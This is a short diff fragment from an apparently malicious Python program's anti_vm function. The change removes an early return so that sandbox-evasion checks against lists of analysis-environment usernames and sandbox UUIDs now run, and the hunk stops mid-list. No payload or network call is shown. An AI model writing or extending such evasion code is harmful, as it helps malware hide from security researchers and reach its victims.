@@ -464,7 +464,6 @@ def anti_vm():
     for indicator in vm_indicators:
         if indicator in platform.uname().system.upper() or indicator in platform.uname().node.upper():
             return True
-    return False
 
     vm_usernames = ['wdagutilityaccount', 'wdc', 'vboxuser', 'vmwareuser', 'administrator', 'user', 'test', 'guest', 'server', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm']
     sandboxuuids = [
